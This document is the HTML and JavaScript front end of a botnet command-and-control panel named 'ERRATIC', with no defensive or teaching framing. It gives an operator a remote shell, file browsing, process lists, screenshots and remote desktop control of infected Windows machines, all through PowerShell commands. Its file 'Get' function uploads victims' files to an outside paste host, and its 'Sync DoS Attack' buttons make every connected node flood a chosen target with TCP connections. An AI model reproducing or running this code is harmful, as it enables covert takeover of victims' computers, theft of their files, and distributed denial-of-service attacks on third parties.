<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ERRATIC | C2 Control</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #000000;
            --sidebar: #0a0000;
            --panel: #120000;
            --accent: #ff0000; 
            --accent-muted: #4a0000;
            --text: #ffffff;
            --text-muted: #888888;
            --border: #220000;
        }

        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }

        .app-container { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }

        /* Sidebar */
        .sidebar { background: var(--sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; height: 100vh; }
        .sidebar-header { padding: 1.5rem; border-bottom: 1px solid var(--border); font-weight: 800; font-size: 1.5rem; color: var(--accent); letter-spacing: 2px; text-shadow: 0 0 10px var(--accent); }
        .global-control-panel { padding: 1rem; border-bottom: 1px solid var(--border); background: #050000; }
        .client-list { flex: 1; overflow-y: auto; padding: 1rem; scrollbar-width: thin; scrollbar-color: var(--accent) var(--bg); }
        .client-list h3 { font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); margin-bottom: 1rem; }

        .client-card { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
        .client-card:hover { border-color: var(--accent); }
        .client-card.selected { border-color: var(--accent); box-shadow: inset 0 0 10px rgba(255,0,0,0.2); }
        .client-card.offline { opacity: 0.4; filter: grayscale(1); }

        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; }
        .online .status-dot { background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: pulse 1.5s infinite; }
        .offline .status-dot { background: #333; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        /* Main View */
        .main-view { display: flex; flex-direction: column; overflow: hidden; }
        .top-nav { height: 60px; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 2rem; }
        .stats-bar { display: flex; background: #050000; border-bottom: 1px solid var(--border); padding: 10px 2rem; gap: 3rem; }
        .stat-item { display: flex; flex-direction: column; }
        .stat-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; }
        .stat-value { color: var(--accent); font-weight: bold; font-family: 'JetBrains Mono'; font-size: 1.1rem; }

        .tabs { display: flex; background: var(--sidebar); padding: 0 1rem; gap: 0.5rem; border-bottom: 1px solid var(--border); }
        .tab-btn { padding: 15px 20px; border: none; background: none; color: var(--text-muted); cursor: pointer; font-weight: 600; border-bottom: 2px solid transparent; }
        .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }

        .content-area { flex: 1; padding: 1.5rem; overflow-y: auto; display: none; flex-direction: column; gap: 1.5rem; }
        .content-area.active { display: flex; }

        /* Terminal */
        .terminal-container { background: #000; border: 1px solid var(--border); display: flex; flex-direction: column; flex: 1; min-height: 200px; }
        .terminal-header { background: var(--sidebar); padding: 5px 15px; font-size: 0.65rem; color: var(--accent); border-bottom: 1px solid var(--border); font-weight: bold; text-transform: uppercase; }
        #shell-output, #system-output { flex: 1; padding: 15px; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
        #system-output { color: #00ff00; }
        #command-input { background: none; border: none; color: white; font-family: 'JetBrains Mono'; padding: 15px; width: 100%; outline: none; }

        /* Explorer */
        .file-browser { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
        .file-header { padding: 1rem; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .file-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid var(--border); cursor: pointer; }
        .file-item:hover { background: rgba(255,0,0,0.1); }
        .file-icon { margin-right: 12px; font-size: 1.2rem; }
        .file-meta { flex: 1; }
        .file-name { font-size: 0.9rem; font-family: 'JetBrains Mono'; color: #fff; }

        .btn-primary { background: var(--accent); color: white; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
        .btn-secondary { background: #111; border: 1px solid var(--border); color: #fff; padding: 5px 10px; cursor: pointer; font-size: 0.75rem; transition: 0.2s; }
        .btn-secondary:hover { border-color: red; color: red; }
        .btn-danger { background: #440000; color: white; border: 1px solid red; padding: 8px 15px; cursor: pointer; }
        .meta-input { background: #000; border: 1px solid var(--border); color: white; padding: 8px; width: 100%; margin-top: 5px; border-radius: 2px; }
        
        /* Remote Desktop Overlay */
        #control-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
        #control-image { max-height: 90vh; border: 2px solid var(--accent); cursor: crosshair; background: #000; }

        .quick-tool-card { background: var(--panel); border: 1px solid var(--border); padding: 1.5rem; border-radius: 4px; }
        .quick-tool-card h4 { margin: 0 0 1rem 0; font-size: 0.8rem; text-transform: uppercase; color: var(--accent); letter-spacing: 1px; }

        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--accent-muted); }
    </style>
</head>
<body>

<div id="control-overlay">
    <div style="margin-bottom: 10px; font-weight: bold; color: var(--accent); letter-spacing: 2px;">REMOTE SESSION | ESC TO EXIT</div>
    <img id="control-image" src="" alt="Live Stream">
</div>

<div class="app-container">
    <div class="sidebar">
        <div class="sidebar-header">ERRATIC</div>
        
        <div class="global-control-panel">
            <h3 style="font-size: 0.6rem; color: var(--accent); margin: 0 0 8px 0;">NETWORK BROADCAST</h3>
            <div style="border-top: 1px solid var(--border); padding-top: 10px;">
                <input type="text" id="broadcast-stress-ip" placeholder="Target IP" class="meta-input" style="font-size: 0.7rem; margin-bottom: 5px;">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
                    <input type="number" id="broadcast-stress-port" placeholder="Port" value="80" class="meta-input" style="font-size: 0.7rem;">
                    <input type="number" id="broadcast-stress-count" placeholder="Requests" value="1000" class="meta-input" style="font-size: 0.7rem;">
                </div>
                <button onclick="broadcastStress()" style="width: 100%; margin-top: 8px; background: #200; color: red; border: 1px solid red; font-size: 0.7rem; cursor: pointer; padding: 5px;">Sync DoS Attack</button>
            </div>
        </div>

        <div class="client-list">
            <h3>Connected Nodes</h3>
            <div id="clients"></div>
        </div>
    </div>

    <div class="main-view">
        <div class="top-nav">
            <div id="node-title" style="font-weight: 700; color: var(--accent);">SELECT A NODE</div>
            <div id="conn-status-indicator" style="font-size: 0.7rem;"></div>
        </div>

        <div class="stats-bar">
            <div class="stat-item">
                <span class="stat-label">Total Online Nodes</span>
                <span class="stat-value" id="net-workers">0</span>
            </div>
        </div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('tab-terminal')">Console</button>
            <button class="tab-btn" onclick="switchTab('tab-files')">Files</button>
            <button class="tab-btn" onclick="switchTab('tab-tools')">Tools</button>
            <button class="tab-btn" onclick="switchTab('tab-processes')">Processes</button>
            <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
        </div>

        <!-- CONSOLE -->
        <div id="tab-terminal" class="content-area active">
            <div style="display: flex; gap: 1rem; height: 100%;">
                <div style="flex: 2; display: flex; flex-direction: column; gap: 1rem;">
                    <div class="terminal-container">
                        <div class="terminal-header">Remote Shell</div>
                        <div id="shell-output">Awaiting input...</div>
                        <input type="text" id="command-input" placeholder="Type directly into shell (#reset to kill hung apps)..." onkeydown="handleTerminalKey(event);" onkeyup="handleTerminalRelease(event);">
                    </div>
                    <div class="terminal-container" style="flex: 0.6; min-height: 150px;">
                        <div class="terminal-header">System Console</div>
                        <div id="system-output">Waiting for system logs...</div>
                    </div>
                </div>
                <div style="flex: 1; display: flex; flex-direction: column; gap: 1rem;">
                    <div class="quick-tool-card">
                        <h4>Live Monitor</h4>
                        <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
                        <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- FILE EXPLORER -->
        <div id="tab-files" class="content-area">
            <div class="file-browser">
                <div class="file-header">
                    <div id="current-path-display" style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">C:\</div>
                    <button class="btn-primary" onclick="refreshFiles()" style="font-size: 0.7rem;">Refresh Explorer</button>
                </div>
                <div id="file-list-container" style="max-height: 600px; overflow-y: auto;"></div>
            </div>
        </div>

        <!-- TOOLS TAB -->
        <div id="tab-tools" class="content-area">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
                <div class="quick-tool-card" style="grid-column: span 2;">
                    <h4>Broadcast Stress Test (DoS)</h4>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <input type="text" id="stress-host" placeholder="Target IP" class="meta-input">
                        <input type="number" id="stress-port" value="80" class="meta-input">
                    </div>
                    <button class="btn-danger" style="width:100%; margin-top: 1rem;" onclick="launchStressTest()">Launch Synchronized Attack</button>
                </div>
                <div class="quick-tool-card" style="grid-column: span 2;">
                    <h4>Macros</h4>
                    <div style="display: flex; gap: 10px; margin-bottom: 1rem;">
                        <input type="text" id="new-macro-name" placeholder="Macro Name" class="meta-input">
                        <input type="text" id="new-macro-cmd" placeholder="Command" class="meta-input">
                        <button class="btn-primary" onclick="addMacro()">Save Macro</button>
                    </div>
                    <div id="macro-container" class="btn-group"></div>
                </div>
            </div>
        </div>

        <!-- PROCESSES -->
        <div id="tab-processes" class="content-area">
            <div class="file-browser">
                <div class="file-header">
                    <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">Running Processes</div>
                    <button class="btn-primary" onclick="requestProcesses()" style="font-size: 0.7rem;">Refresh Processes</button>
                </div>
                <div style="max-height: 600px; overflow-y: auto;">
                    <table style="width: 100%; border-collapse: collapse; font-family: 'JetBrains Mono'; font-size: 0.85rem; color: #fff;">
                        <thead>
                            <tr style="border-bottom: 1px solid var(--border); color: var(--text-muted); text-align: left;">
                                <th style="padding: 10px;">Name</th>
                                <th style="padding: 10px;">PID</th>
                                <th style="padding: 10px;">Mem</th>
                            </tr>
                        </thead>
                        <tbody id="process-list-body"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <div id="tab-identity" class="content-area">
            <div class="quick-tool-card">
                <h4>Node Alias</h4>
                <input type="text" id="edit-alias" class="meta-input">
                <h4 style="margin-top:20px">Description</h4>
                <textarea id="edit-desc" class="meta-input" rows="4"></textarea>
                <button class="btn-primary" style="margin-top: 15px;" onclick="saveMetadata()">Update Identity</button>
            </div>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
<script>
    {% raw %}
    const socket = io('/api');
    let current_client_id = null;
    let current_client_hostname = null;
    let allConnectedClients = [];
    let isControlMode = false;
    let shellHistory = {};
    let systemHistory = {};
    let clientStates = {}; 

    const DIR_START_MARKER = '##DIR_START##';
    const DIR_END_MARKER = '##DIR_END##';
    const STALE_MS = 10000; 
    const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';

    function switchTab(tabId) {
        document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        event.currentTarget.classList.add('active');
    }

    socket.on('connect', () => { socket.emit('join_dashboard'); });

    socket.on('client_list', (clients) => {
        allConnectedClients = clients;
        const list = document.getElementById('clients');
        list.innerHTML = '';
        clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);

        clients.forEach(client => {
            const div = document.createElement('div');
            div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
            div.innerHTML = `
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div style="font-weight:600; font-size:0.85rem;"><span class="status-dot"></span>${client.alias || client.hostname}</div>
                </div>
            `;
            if (client.online) div.onclick = () => selectClient(client);
            list.appendChild(div);
        });
        updateGlobalStats();
    });

    function updateTerminalUI(divId, text) {
        const div = document.getElementById(divId);
        if (!text) return;

        for (let i = 0; i < text.length; i++) {
            const char = text[i];
            if (char === '\b') {
                if (div.lastChild && div.lastChild.nodeType === 3) {
                    const val = div.lastChild.nodeValue;
                    if (val.length > 0) {
                        div.lastChild.nodeValue = val.slice(0, -1);
                    } else {
                        div.removeChild(div.lastChild);
                    }
                }
            } else if (char === '\r') {
                continue;
            } else {
                div.appendChild(document.createTextNode(char));
            }
        }
        div.scrollTop = div.scrollHeight;
    }

    socket.on('command_output', (data) => {
        const targetClient = allConnectedClients.find(c => c.id === data.client_id);
        if (!targetClient) return;
        
        if (!clientStates[targetClient.hostname]) {
            clientStates[targetClient.hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
        }
        const state = clientStates[targetClient.hostname];

        // 1. Check for Start of JSON Stream
        if (data.output.includes(DIR_START_MARKER)) {
            state.isCapturingJSON = true;
            state.jsonBuffer = "";
            const idx = data.output.indexOf(DIR_START_MARKER);
            state.jsonBuffer = data.output.substring(idx + DIR_START_MARKER.length);
            
            if (data.client_id === current_client_id) {
                updateTerminalUI('shell-output', data.output.substring(0, idx) + "[Syncing File Explorer...]\n");
            }
        } else if (state.isCapturingJSON) {
            state.jsonBuffer += data.output;
        } else {
            // Standard Terminal Output
            if (!shellHistory[targetClient.hostname]) shellHistory[targetClient.hostname] = "";
            shellHistory[targetClient.hostname] += data.output;
            if (data.client_id === current_client_id) {
                updateTerminalUI('shell-output', data.output);
            }
        }

        // 2. Check for End of JSON Stream
        if (state.isCapturingJSON && state.jsonBuffer.includes(DIR_END_MARKER)) {
            const endIdx = state.jsonBuffer.indexOf(DIR_END_MARKER);
            const finalJSON = state.jsonBuffer.substring(0, endIdx);
            renderFileSystem(finalJSON);
            state.isCapturingJSON = false;
            state.jsonBuffer = "";
        }
    });

    socket.on('system_output', (data) => {
        const targetClient = allConnectedClients.find(c => c.id === data.client_id);
        if (!targetClient) return;
        if (!systemHistory[targetClient.hostname]) systemHistory[targetClient.hostname] = "";
        systemHistory[targetClient.hostname] += data.output;
        if (data.client_id === current_client_id) {
            updateTerminalUI('system-output', data.output);
        }
    });

    function refreshFiles() {
        if (!current_client_id || !current_client_hostname) return;
        if (!clientStates[current_client_hostname]) {
            clientStates[current_client_hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
        }
        const path = clientStates[current_client_hostname].currentPath || "C:\\";
        const sMark = '##' + 'DIR_START##'; // Prevent parser triggering on echo
        const eMark = '##' + 'DIR_END##';
        const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${sMark}'; (ConvertTo-Json -InputObject $items -Compress); echo '${eMark}' } else { echo '${sMark} [] ${eMark}' }"`;
        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
    }

    function renderFileSystem(jsonStr) {
        const container = document.getElementById('file-list-container');
        if (!current_client_hostname || !clientStates[current_client_hostname]) return;
        let currentPath = clientStates[current_client_hostname].currentPath;
        document.getElementById('current-path-display').textContent = currentPath;
        container.innerHTML = '';
        const back = document.createElement('div');
        back.className = 'file-item';
        back.innerHTML = `<div class="file-icon">📁</div><div class="file-meta"><div class="file-name">.. (Parent Directory)</div></div>`;
        back.onclick = () => {
            const parts = currentPath.split('\\').filter(p => p.length > 0);
            if (parts.length > 1) { parts.pop(); clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; refreshFiles(); }
        };
        container.appendChild(back);
        try {
            let items = JSON.parse(jsonStr.trim() || "[]");
            if (!Array.isArray(items)) items = items ? [items] : [];
            items.forEach(item => {
                const el = document.createElement('div');
                el.className = 'file-item';
                el.innerHTML = `<div class="file-icon">${item.IsDirectory ? '📁' : '📄'}</div><div class="file-meta"><div class="file-name">${item.Name}</div></div>${!item.IsDirectory ? `<button class="btn-secondary" onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}`;
                el.onclick = () => { if (item.IsDirectory) { clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\'; refreshFiles(); } };
                container.appendChild(el);
            });
        } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Failed to parse file data.</div>`; }
    }

    function downloadFile(name, event) {
        event.stopPropagation();
        const fullPath = (clientStates[current_client_hostname].currentPath + name).replace(/'/g, "''");
        const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
        const cmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished' }"`;
        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
    }

    function enterControlMode() {
        if (!current_client_id) return;
        isControlMode = true;
        document.getElementById('control-overlay').style.display = 'flex';
        socket.emit('system_command', { 'command': '#scrsht 100', 'client_id': current_client_id });
    }

    document.getElementById('control-image').onclick = function(e) {
        if (!isControlMode || !current_client_id) return;
        const rect = this.getBoundingClientRect();
        const x = Math.floor(((e.clientX - rect.left) / rect.width) * 65535);
        const y = Math.floor(((e.clientY - rect.top) / rect.height) * 65535);
        const cmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $sig = '[DllImport(\\"user32.dll\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, uint e);'; $type = Add-Type -MemberDefinition $sig -Name \\"Win32Utils\\" -Namespace \\"Win32Utils\\" -PassThru; $type::mouse_event(0x8001, ${x}, ${y}, 0, 0); $type::mouse_event(0x0002, 0, 0, 0, 0); $type::mouse_event(0x0004, 0, 0, 0, 0);"`;
        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
    };

    function mapKeyToSendKeys(key) {
        const map = { 'Enter': '{ENTER}', 'Backspace': '{BACKSPACE}', 'Escape': '{ESC}', 'Tab': '{TAB}', ' ': ' ', 'Control': '^', 'Shift': '+', 'Alt': '%', 'ArrowUp': '{UP}', 'ArrowDown': '{DOWN}', 'ArrowLeft': '{LEFT}', 'ArrowRight': '{RIGHT}', 'Delete': '{DEL}', 'Insert': '{INS}', 'Home': '{HOME}', 'End': '{END}', 'PageUp': '{PGUP}', 'PageDown': '{PGDN}' };
        if (map[key]) return map[key];
        if (key.length === 1) { if ("~%^(){}+".includes(key)) return "{" + key + "}"; return key; }
        return "";
    }

    window.addEventListener('keydown', (e) => { 
        if (!current_client_id) return;
        if (e.key === 'Escape' && isControlMode) { 
            isControlMode = false; document.getElementById('control-overlay').style.display = 'none'; 
            socket.emit('system_command', { 'command': '#scrsht 1000', 'client_id': current_client_id }); return;
        }
        if (isControlMode) {
            const sk = mapKeyToSendKeys(e.key);
            if (sk) {
                const cmd = `powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${sk.replace(/'/g, "''")}')"`;
                socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
            }
            e.preventDefault();
        }
    });

    socket.on('screenshot_data', (data) => { if (data.client_id === current_client_id) { const s = "data:image/jpeg;base64," + data.image_data; document.getElementById('screenshot-image').src = s; if (isControlMode) document.getElementById('control-image').src = s; } });

    function launchStressTest() {
        const host = document.getElementById('stress-host').value;
        const port = document.getElementById('stress-port').value;
        if(!host) return;
        const cmd = `powershell -Command "1..1000 | ForEach { $t = New-Object Net.Sockets.TcpClient; try { $t.Connect('${host}', ${port}); $t.Close() } catch {} }"`;
        allConnectedClients.forEach(c => { if(c.online) socket.emit('command', { command: cmd, client_id: c.id }); });
    }

    function requestProcesses() {
        if (!current_client_id) return;
        socket.emit('system_command', { command: '#ps', client_id: current_client_id });
    }

    socket.on('process_list', (data) => {
        if (data.client_id === current_client_id) {
            const body = document.getElementById('process-list-body');
            body.innerHTML = '';
            data.processes.forEach(p => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid var(--border)';
                tr.innerHTML = `<td style="padding: 10px;">${p.name}</td><td style="padding: 10px;">${p.pid}</td><td style="padding: 10px;">${p.mem}</td>`;
                body.appendChild(tr);
            });
        }
    });

    function addMacro() {
        const name = document.getElementById('new-macro-name').value;
        const command = document.getElementById('new-macro-cmd').value;
        if(name && command) socket.emit('add_macro', {name, command});
    }

    socket.on('macro_list', (macros) => {
        const container = document.getElementById('macro-container');
        container.innerHTML = '';
        macros.forEach(m => {
            const btn = document.createElement('button');
            btn.className = 'btn-secondary'; btn.textContent = m.name;
            btn.onclick = () => socket.emit('command', { command: m.command, client_id: current_client_id });
            container.appendChild(btn);
        });
    });

    function selectClient(client) {
        current_client_id = client.id; current_client_hostname = client.hostname;
        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
        document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
        document.getElementById('shell-output').textContent = "";
        updateTerminalUI('shell-output', shellHistory[client.hostname] || "Connected to Shell.\n");
        document.getElementById('system-output').textContent = "";
        updateTerminalUI('system-output', systemHistory[client.hostname] || "Connected to System.\n");
        if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
    }

    let stdinBuffer = "";
    let stdinTimeout = null;

    function handleTerminalKey(event) {
        if (!current_client_id) return;
        const inp = document.getElementById('command-input');
        const val = inp.value;
        const state = clientStates[current_client_hostname];

        if (event.ctrlKey && event.key.toLowerCase() === 'c') {
            socket.emit('system_command', { command: '#sigint', client_id: current_client_id });
            state.line = "";
            event.preventDefault(); return;
        }
        if (event.ctrlKey || event.altKey) return;

        if (val.startsWith('#')) {
            if (event.key === 'Enter') {
                socket.emit('system_command', { command: val, client_id: current_client_id });
                inp.value = ''; event.preventDefault();
            }
            return;
        }

        if (event.key === 'Enter') {
            const cmd = state.line + '\r\n';
            let erase = "";
            for(let i=0; i<state.line.length; i++) erase += "\b";
            updateTerminalUI('shell-output', erase);
            socket.emit('stdin', { command: cmd, client_id: current_client_id });
            state.line = "";
            inp.value = '';
            event.preventDefault();
            return;
        }

        if (event.key === 'Backspace') {
            if (state.line.length > 0) {
                state.line = state.line.slice(0, -1);
                updateTerminalUI('shell-output', '\b');
            }
            event.preventDefault();
            return;
        }

        if (event.key.length === 1) {
            state.line += event.key;
            updateTerminalUI('shell-output', event.key);
            setTimeout(() => { if(!inp.value.startsWith('#')) inp.value = ''; }, 10);
        }
    }

    function handleTerminalRelease(event) {
        if (!current_client_id) return;
        const state = clientStates[current_client_hostname];
        if (event.ctrlKey && event.shiftKey && event.key.toLowerCase() === 'v') {
            navigator.clipboard.readText().then(text => {
                if (text) {
                    state.line += text;
                    updateTerminalUI('shell-output', text);
                }
            });
        }
    }

    function sendCommand() {}
    function updateGlobalStats() {
        const onlineCount = allConnectedClients.filter(c => c.online).length;
        document.getElementById('net-workers').textContent = onlineCount;
    }
    function saveMetadata() { socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value }); }
    setInterval(() => { updateGlobalStats(); }, 2000);
    {% endraw %}
</script>
</body>
</html>
